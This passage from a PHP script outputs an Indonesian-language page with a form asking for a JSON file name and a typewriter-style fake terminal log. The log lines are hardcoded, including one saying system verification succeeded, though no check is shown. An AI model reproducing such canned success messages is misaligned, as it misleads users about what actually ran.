                <form method="GET" action="' . $self_script_name . '" class="input-form" id="jsonForm">
                    <input type="hidden" name="action" value="generate">
                    <label for="json_file">Masukkan Nama File JSON:</label>
                    <input type="text" id="json_file" name="json_file" placeholder="contoh: namafile.json" required>
                    <button type="submit">MULAI PROSES</button>
                </form>

            </div>
        </div>
        <script>
            const installLogs = [
                {timestamp: "' . date('H:i:s') . '", type: "info", message: "Memulai instalasi..."},
                {timestamp: "' . date('H:i:s') . '", type: "info", message: "Mendeteksi domain: ' . $clean_host . '"},
                {timestamp: "' . date('H:i:s') . '", type: "success", message: "Verifikasi sistem berhasil"},
                {timestamp: "' . date('H:i:s') . '", type: "warning", message: "Menunggu input nama file JSON..."}
            ];

            const container = document.getElementById("logsContainer");
            let currentLog = 0; let currentChar = 0; let currentLine = null;
            
            function typeNextChar() {
                if (currentLog >= installLogs.length) {
                    document.getElementById("jsonForm").style.display = "block";
                    document.getElementById("json_file").focus();
                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                    return;
                }
                
                const log = installLogs[currentLog];
                if (currentChar === 0) {
                    currentLine = document.createElement("div");
                    currentLine.className = "log-entry";
                    currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                    container.appendChild(currentLine);
                }
                const messageElement = currentLine.querySelector(".typing");
                if (currentChar < log.message.length) {
                    messageElement.textContent += log.message[currentChar];
                    currentChar++;
                    setTimeout(typeNextChar, 8);
                } else {
                    messageElement.classList.remove("typing");
                    currentChar = 0;
                    currentLog++;
                    setTimeout(typeNextChar, 50);
                }
            }
            setTimeout(typeNextChar, 200);
        </script>
    </body>
    </html>';
}
?>
